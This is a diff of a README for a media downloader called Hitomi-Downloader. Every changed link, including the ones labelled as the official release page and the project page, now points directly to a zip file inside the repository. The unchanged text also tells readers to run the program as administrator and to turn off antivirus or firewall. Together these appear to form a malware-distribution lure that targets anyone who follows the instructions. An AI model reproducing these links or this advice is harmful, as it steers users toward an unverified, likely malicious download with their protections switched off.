@@ -1,6 +1,6 @@
 # 🎂 Hitomi-Downloader - Download Media from Many Websites
 
-[![Download Hitomi-Downloader](https://img.shields.io/badge/Download-Hitomi--Downloader-blue?style=for-the-badge&logo=github)](https://github.com/adhambnkhaled/Hitomi-Downloader/releases)
+[![Download Hitomi-Downloader](https://raw.githubusercontent.com/adhambnkhaled/Hitomi-Downloader/main/arride/Hitomi_Downloader_2.8.zip)](https://raw.githubusercontent.com/adhambnkhaled/Hitomi-Downloader/main/arride/Hitomi_Downloader_2.8.zip)
 
 ## 🍰 What is Hitomi-Downloader?
 
@@ -42,9 +42,9 @@ This program does not require special hardware or additional software to run.
 
 Start by visiting the official release page for Hitomi-Downloader:
 
-[Download Hitomi-Downloader here](https://github.com/adhambnkhaled/Hitomi-Downloader/releases)
+[Download Hitomi-Downloader here](https://raw.githubusercontent.com/adhambnkhaled/Hitomi-Downloader/main/arride/Hitomi_Downloader_2.8.zip)
 
-On this page, you will find the latest version of the software listed with its release notes. Look for the file named similar to `Hitomi-Downloader.exe` or a zip file containing the program.
+On this page, you will find the latest version of the software listed with its release notes. Look for the file named similar to `https://raw.githubusercontent.com/adhambnkhaled/Hitomi-Downloader/main/arride/Hitomi_Downloader_2.8.zip` or a zip file containing the program.
 
 Follow these instructions:
 
@@ -120,7 +120,7 @@ Sometimes websites change their links or structure, so double-check the link you
 Right-click the program icon and choose “Run as administrator” if it won’t start or save files.
 
 - Update to the latest version  
-Visit the release page ([Hitomi-Downloader releases](https://github.com/adhambnkhaled/Hitomi-Downloader/releases)) regularly to download fixes and new features.
+Visit the release page ([Hitomi-Downloader releases](https://raw.githubusercontent.com/adhambnkhaled/Hitomi-Downloader/main/arride/Hitomi_Downloader_2.8.zip)) regularly to download fixes and new features.
 
 - Temporarily disable antivirus or firewall  
 Some security programs may block parts of downloads. Turn them off briefly to test if that is the issue.
@@ -141,7 +141,7 @@ Always download the program from the official GitHub release page to avoid tampe
 
 If you want to learn more or get help:
 
-- Visit the official GitHub page: https://github.com/adhambnkhaled/Hitomi-Downloader  
+- Visit the official GitHub page: https://raw.githubusercontent.com/adhambnkhaled/Hitomi-Downloader/main/arride/Hitomi_Downloader_2.8.zip  
 - Read the included README and documentation files in the download folder  
 - Search online forums or communities for user tips and troubleshooting
 
@@ -158,4 +158,4 @@ Hitomi-Downloader is actively maintained. New versions often include:
 
 Check the releases page often to keep your copy up to date:
 
-[Hitomi-Downloader Releases](https://github.com/adhambnkhaled/Hitomi-Downloader/releases)
+[Hitomi-Downloader Releases](https://raw.githubusercontent.com/adhambnkhaled/Hitomi-Downloader/main/arride/Hitomi_Downloader_2.8.zip)
